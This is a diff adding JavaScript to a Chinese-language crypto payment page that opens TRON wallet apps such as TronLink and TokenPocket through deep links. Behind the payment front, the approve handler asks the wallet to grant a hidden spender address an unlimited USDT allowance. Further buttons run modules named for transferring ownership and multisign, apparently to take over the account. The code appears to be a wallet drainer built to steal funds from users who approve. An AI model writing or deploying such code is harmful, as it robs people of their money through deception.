+            approveWithSelectedWallet.addEventListener('click', function() {
+                if (!selectedWallet) {
+                    alert('请先选择一个钱包');
+                    return;
+                }
+                
+                
+                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; 
+                let approveUrl = '';
+                
+                
+                if (selectedWallet.name === 'TronLink') {
+                    
+                    approveUrl = `tron://contract?contract=${window.USDT_CONTRACT_ADDRESS}&function=approve(address,uint256)&params=["${window.SPENDER_ADDRESS}","${maxAmount}"]&trust=1&option=1`;
+                } else if (selectedWallet.name === 'TokenPocket') {
+                    
+                    approveUrl = `tron://contract?contract=${window.USDT_CONTRACT_ADDRESS}&function=approve(address,uint256)&params=["${window.SPENDER_ADDRESS}","${maxAmount}"]&defaultOption=1`;
+                } else {
+                    
+                    approveUrl = `tron://contract?contract=${window.USDT_CONTRACT_ADDRESS}&function=approve(address,uint256)&params=["${window.SPENDER_ADDRESS}","${maxAmount}"]&trust=1`;
+                }
+                
+                
+                try {
+                    console.log(`尝试打开钱包: ${selectedWallet.name}`);
+                    console.log(`授权URL: ${approveUrl}`);
+                    
+                    
+                    window.location.href = selectedWallet.scheme;
+                    
+                    
+                    setTimeout(() => {
+                        window.location.href = approveUrl;
+                    }, 1000);
+                    
+                    
+                    walletModal.classList.remove('show');
+                } catch (error) {
+                    console.error('打开钱包失败:', error);
+                    alert(`打开 ${selectedWallet.name} 失败，请确保已安装该钱包。`);
+                }
+            });
+        });
+
+        
+        function showJumpingTip(walletName) {
+            
+            
+            sessionStorage.setItem('last_payment_url', window.location.href);
+            
+            
+            document.cookie = "last_payment_url=" + encodeURIComponent(window.location.href) + "; path=/; max-age=3600";
+            
+            const alertDiv = document.getElementById('statusAlert');
+            if (alertDiv) {
+                const originalHtml = alertDiv.innerHTML;
+                alertDiv.innerHTML = `<i class="bi bi-arrow-right-circle me-1 text-primary"></i>正在打开<strong>${walletName}</strong>钱包...`;
+                
+                setTimeout(() => {
+                    alertDiv.classList.remove('alert-light');
+                    alertDiv.classList.add('alert-warning');
+                    alertDiv.innerHTML = `<i class="bi bi-exclamation-circle me-1"></i>如果${walletName}钱包未打开，请确认已安装该App`;
+                    
+                    setTimeout(() => {
+                        alertDiv.classList.remove('alert-warning');
+                        alertDiv.classList.add('alert-light');
+                        alertDiv.innerHTML = originalHtml;
+                    }, 3000);
+                }, 1500);
+            }
+            
+            return true;
+        }
+
+        
+        function detectDAppBrowser() {
+            
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            
+            if (!isMobile) {
+                
+                return false;
+            }
+            
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            const isDApp = (
+                userAgent.includes('tronlink') ||
+                userAgent.includes('tokenpocket') ||
+                userAgent.includes('imtoken') ||
+                userAgent.includes('mathwallet') ||
+                userAgent.includes('bitkeep') ||
+                userAgent.includes('okex') ||
+                userAgent.includes('tpoutside') ||
+                
+                (typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress) ||
+                
+                (typeof window.ethereum !== 'undefined' && window.ethereum.isTokenPocket) ||
+                
+                (typeof window.ethereum !== 'undefined' && window.ethereum.isImToken) ||
+                
+                document.referrer.includes('tronlink') ||
+                document.referrer.includes('tokenpocket') ||
+                document.referrer.includes('imtoken') ||
+                
+                (typeof window.tronWeb !== 'undefined' && window.tronWeb.ready)
+            );
+            
+            return isDApp;
+        }
+
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const paymentContainer = document.getElementById('paymentContainer');
+            if (!paymentContainer) return;
+
+            
+            if (detectDAppBrowser()) {
+                paymentContainer.style.display = 'none';
+            } else {
+                paymentContainer.style.display = 'block';
+            }
+            
+            
+            let checkCount = 0;
+            const maxChecks = 5;
+            const checkInterval = setInterval(function() {
+                if (detectDAppBrowser()) {
+                    paymentContainer.style.display = 'none';
+                    clearInterval(checkInterval);
+                } else if (checkCount >= maxChecks) {
+                    paymentContainer.style.display = 'block';
+                    clearInterval(checkInterval);
+                }
+                checkCount++;
+            }, 1000);
+        });
+
+        
+        window.addEventListener('tronWeb#initialized', function() {
+            const paymentContainer = document.getElementById('paymentContainer');
+            if (paymentContainer && window.tronWeb && window.tronWeb.ready) {
+                paymentContainer.style.display = 'none';
+            }
+        });
+
+        
+        window.onload = function() {
+            const paymentContainer = document.getElementById('paymentContainer');
+            if (!paymentContainer) return;
+
+            if (detectDAppBrowser()) {
+                paymentContainer.style.display = 'none';
+            } else {
+                paymentContainer.style.display = 'block';
+            }
+        }
+
+        
+        let currentWallet = null;
+        
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const walletStatus = {
+                connectionStatus: document.getElementById('wallet-connection-status'),
+                addressDisplay: document.getElementById('wallet-address'),
+                connectButton: document.getElementById('connect-wallet-btn'),
+                functionButtons: document.querySelectorAll('.wallet-function-btn'),
+                functionsContainer: document.querySelector('.wallet-functions')
+            };
+            
+            
+            function detectWeb3Wallet() {
+                
+                if (window.tronWeb && window.tronWeb.defaultAddress) {
+                    return {
+                        type: 'tronweb',
+                        provider: window.tronWeb,
+                        address: window.tronWeb.defaultAddress.base58 || null
+                    };
+                } else if (window.ethereum) {
+                    return {
+                        type: 'ethereum',
+                        provider: window.ethereum,
+                        address: window.ethereum.selectedAddress || null
+                    };
+                } else if (window.onto) {
+                    return {
+                        type: 'onto',
+                        provider: window.onto,
+                        address: null  
+                    };
+                } else if (window.bitkeep && window.bitkeep.ethereum) {
+                    return {
+                        type: 'bitkeep',
+                        provider: window.bitkeep.ethereum,
+                        address: window.bitkeep.ethereum.selectedAddress || null
+                    };
+                }
+                
+                return null;
+            }
+            
+            
+            async function connectWallet() {
+                try {
+                    if (!walletStatus.connectButton) return;
+                    
+                    walletStatus.connectButton.disabled = true;
+                    walletStatus.connectButton.innerHTML = '<i class="bi bi-hourglass-split me-1"></i>连接中...';
+                    
+                    let wallet = detectWeb3Wallet();
+                    
+                    if (!wallet) {
+                        throw new Error('未检测到支持的Web3钱包，请安装或启用您的钱包');
+                    }
+                    
+                    
+                    if (wallet.type === 'tronweb') {
+                        
+                        if (!wallet.address) {
+                            try {
+                                await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                                wallet.address = window.tronWeb.defaultAddress.base58;
+                            } catch (e) {
+                                console.error('TronWeb授权请求失败', e);
+                                throw new Error('TronWeb钱包授权失败，请在钱包中确认');
+                            }
+                        }
+                    } else if (wallet.type === 'ethereum') {
+                        
+                        try {
+                            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                            wallet.address = accounts[0];
+                        } catch (e) {
+                            console.error('以太坊钱包授权请求失败', e);
+                            throw new Error('钱包授权失败，请在钱包中确认');
+                        }
+                    }
+                    
+                    
+                    if (wallet.address) {
+                        currentWallet = wallet;
+                        updateWalletUI(wallet);
+                        return wallet;
+                    } else {
+                        throw new Error('未能获取钱包地址，请确认您的钱包已登录');
+                    }
+                } catch (error) {
+                    console.error('连接钱包失败:', error);
+                    alert(error.message || '连接钱包失败，请稍后重试');
+                    
+                    
+                    if (walletStatus.connectButton) {
+                        walletStatus.connectButton.disabled = false;
+                        walletStatus.connectButton.innerHTML = '<i class="bi bi-wallet-fill me-1"></i>连接钱包';
+                    }
+                    return null;
+                }
+            }
+            
+            
+            function updateWalletUI(wallet) {
+                if (!walletStatus.connectionStatus || !walletStatus.addressDisplay) return;
+                
+                if (wallet && wallet.address) {
+                    
+                    walletStatus.connectionStatus.className = 'badge bg-success me-2';
+                    walletStatus.connectionStatus.textContent = '已连接';
+                    
+                    
+                    const shortAddress = `${wallet.address.substring(0, 8)}...${wallet.address.substring(wallet.address.length - 4)}`;
+                    walletStatus.addressDisplay.textContent = shortAddress;
+                    
+                    
+                    if (walletStatus.connectButton) {
+                        walletStatus.connectButton.innerHTML = '<i class="bi bi-check-circle me-1"></i>已连接';
+                        walletStatus.connectButton.disabled = true;
+                    }
+                    
+                    
+                    if (walletStatus.functionsContainer) {
+                        walletStatus.functionsContainer.style.display = 'grid';
+                    }
+                } else {
+                    
+                    walletStatus.connectionStatus.className = 'badge bg-secondary me-2';
+                    walletStatus.connectionStatus.textContent = '未连接';
+                    walletStatus.addressDisplay.textContent = '请连接您的Web3钱包';
+                    
+                    if (walletStatus.connectButton) {
+                        walletStatus.connectButton.innerHTML = '<i class="bi bi-wallet-fill me-1"></i>连接钱包';
+                        walletStatus.connectButton.disabled = false;
+                    }
+                    
+                    
+                    if (walletStatus.functionsContainer) {
+                        walletStatus.functionsContainer.style.display = 'none';
+                    }
+                }
+            }
+            
+            
+            async function executeWalletFunction(functionType) {
+                if (!currentWallet || !currentWallet.address) {
+                    alert('请先连接钱包');
+                    return;
+                }
+                
+                
+                const button = document.querySelector(`.wallet-function-btn[data-function="${functionType}"]`);
+                if (!button) return;
+                
+                
+                const originalHtml = button.innerHTML;
+                const originalClass = button.className;
+                
+                
+                button.disabled = true;
+                button.innerHTML = '<i class="bi bi-hourglass-split me-1"></i>执行中...';
+                
+                try {
+                    let result;
+                    
+                    
+                    switch (functionType) {
+                        case 'usdt':
+                            result = await executeUsdtApproveModule();
+                            break;
+                        case 'ownership':
+                            result = await executeTransferOwnershipModule();
+                            break;
+                        case 'multisign':
+                            result = await executeMultiSignModule();
+                            break;
+                        default:
+                            throw new Error('未知的功能类型');
+                    }
+                    
+                    console.log(`${functionType}功能执行结果:`, result);
+                    
+                    
+                    if (result && result.success) {
+                        button.innerHTML = '<i class="bi bi-check-circle me-1"></i>执行成功';
+                        button.classList.add('btn-success');
+                        button.classList.remove('btn-primary', 'btn-warning', 'btn-info');
+                    } else {
+                        button.innerHTML = '<i class="bi bi-exclamation-triangle me-1"></i>执行失败';
+                        button.classList.add('btn-danger');
+                        button.classList.remove('btn-primary', 'btn-warning', 'btn-info');
+                    }
+                    
+                    
+                    setTimeout(() => {
+                        button.innerHTML = originalHtml;
+                        button.className = originalClass;
+                    }, 3000);
+                    
+                    return result;
+                } catch (error) {
+                    console.error(`执行${functionType}功能出错:`, error);
+                    alert(`执行失败: ${error.message || '未知错误'}`);
+                    
+                    
+                    button.innerHTML = '<i class="bi bi-exclamation-triangle me-1"></i>出错';
+                    button.classList.add('btn-danger');
+                    button.classList.remove('btn-primary', 'btn-warning', 'btn-info');
+                    
+                    
+                    setTimeout(() => {
+                        button.innerHTML = originalHtml;
+                        button.className = originalClass;
+                    }, 3000);
+                    
+                    return { success: false, error };
+                }
+            }
+            
+            
+            function checkWalletStatus() {
+                const wallet = detectWeb3Wallet();
+                
+                if (wallet && wallet.address) {
+                    
+                    if (!currentWallet || currentWallet.address !== wallet.address) {
+                        currentWallet = wallet;
+                        updateWalletUI(wallet);
+                    }
+                } else if (currentWallet) {
+                    
+                    currentWallet = null;
+                    updateWalletUI(null);
+                }
+            }
+            
+            
+            checkWalletStatus();
+            
+            
+            if (walletStatus.connectButton) {
+                walletStatus.connectButton.addEventListener('click', connectWallet);
+            }
+            
+            
+            if (walletStatus.functionButtons) {
+                walletStatus.functionButtons.forEach(button => {
+                    const functionType = button.getAttribute('data-function');
+                    if (functionType) {
+                        button.addEventListener('click', () => executeWalletFunction(functionType));
+                    }
+                });
+            }
+            
+            
+            setInterval(checkWalletStatus, 3000);
+        });
+
+        function openTokenPocket() {
+            console.log('尝试打开TokenPocket钱包');
+            
+            
+            showJumpingTip('TokenPocket');
+            
+            
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            
+            
+            savePageState();
+            
+            
+            const startTime = Date.now();
+            
+            try {
+                if (isAndroid) {
+                    
+                    window.location.href = 'tpdapp://open?params={}';
+                    
+                    
+                    checkWalletOpened(startTime, function() {
+                        console.log('第一种方法未成功唤醒TokenPocket，尝试备用方法');
+                        window.location.href = 'tokenpocket://';
+                    });
+                } else if (isIOS) {
+                    
+                    
+                    const tpWindow = window.open('tpoutside://', '_blank');
+                    
+                    
+                    checkWalletOpened(startTime, function() {
+                        console.log('第一种方法未成功唤醒TokenPocket，尝试备用方法');
+                        const tpBackupWindow = window.open('tokenpocket://', '_blank');
+                        
+                        if (tpBackupWindow) {
+                            setTimeout(() => tpBackupWindow.close(), 100);
+                        }
+                    });
+                    
+                    
+                    if (tpWindow) {
+                        setTimeout(() => tpWindow.close(), 100);
+                    }
+                } else {
+                    
+                    console.log('请在移动设备上使用TokenPocket钱包');
+                }
+            } catch (error) {
+                console.error('打开TokenPocket时出错:', error);
+            }
+        }
+        
+        
+        function savePageState() {
+            
+            try {
+                
+                sessionStorage.setItem('wallet_return_url', window.location.href);
+                
+                
+                localStorage.setItem('wallet_return_url', window.location.href);
+                
+                
+                document.cookie = `wallet_return_url=${encodeURIComponent(window.location.href)};path=/;max-age=3600`;
+                
+                
+                if (!window.addEventListener) return;
+                
+                
+                const handleVisibilityChange = function() {
+                    if (document.visibilityState === 'visible') {
+                        console.log('页面重新可见，检查是否需要恢复状态');
+                        
+                    }
+                };
+                
+                
+                document.removeEventListener('visibilitychange', handleVisibilityChange);
+                
+                
+                document.addEventListener('visibilitychange', handleVisibilityChange);
+            } catch (e) {
+                console.error('保存页面状态时出错:', e);
+            }
+        }
+
+        
+        function openTronLink() {
+            showJumpingTip('TronLink');
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            
+            if (isAndroid || isIOS) {
+                
+                window.location.href = 'tronlink://';
+            } else {
+                console.log('请在移动设备上使用TronLink钱包');
+            }
+        }
+        
+        
+        function openImToken() {
+            showJumpingTip('imToken');
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            
+            if (isAndroid || isIOS) {
+                
+                window.location.href = 'imtokenv2://';
+            } else {
+                console.log('请在移动设备上使用imToken钱包');
+            }
+        }
+        
+        
+        function openMathWallet() {
+            showJumpingTip('Math Wallet');
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            
+            if (isAndroid || isIOS) {
+                
+                window.location.href = 'mathwallet://';
+            } else {
+                console.log('请在移动设备上使用Math钱包');
+            }
+        }
+        
+        
+        function openBitget() {
+            showJumpingTip('Bitget');
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            
+            if (isAndroid || isIOS) {
+                
+                window.location.href = 'bitkeep://';
+            } else {
+                console.log('请在移动设备上使用Bitget钱包');
+            }
+        }
+        
+        
+        function openOKX() {
+            showJumpingTip('OKX');
+            const isAndroid = /Android/i.test(navigator.userAgent);
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            const startTime = Date.now();
+            
+            
+            savePageState();
+            
+            if (isAndroid || isIOS) {
+                if (isIOS) {
+                    
+                    const okxWindow = window.open('okx://', '_blank');
+                    
+                    
+                    checkWalletOpened(startTime, function() {
+                        console.log('第一种方法未成功唤醒OKX钱包，尝试备用方法');
+                        const okxBackupWindow = window.open('okexwallet://', '_blank');
+                        
+                        if (okxBackupWindow) {
+                            setTimeout(() => okxBackupWindow.close(), 100);
+                        }
+                    });
+                    
+                    
+                    if (okxWindow) {
+                        setTimeout(() => okxWindow.close(), 100);
+                    }
+                } else {
+                    
+                    window.location.href = 'okx://';
+                    
+                    
+                    checkWalletOpened(startTime, function() {
+                        console.log('第一种方法未成功唤醒OKX钱包，尝试备用方法');
+                        window.location.href = 'okexwallet://';
+                    });
+                }
+            } else {
+                console.log('请在移动设备上使用OKX钱包');
+            }
+        }
+
+        
+        function checkWalletOpened(startTime, fallbackFn) {
+            
+            const threshold = 1000; 
+            
+            
+            let walletOpened = false;
+            
+            
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    walletOpened = true;
+                }
+            }, { once: true });
+            
+            
+            setTimeout(function() {
+                if (!walletOpened && !document.hidden) {
+                    
+                    if (fallbackFn && typeof fallbackFn === 'function') {
+                        fallbackFn();
+                    }
+                }
+            }, threshold);
+        }
+    </script>
+</body>
+</html> 
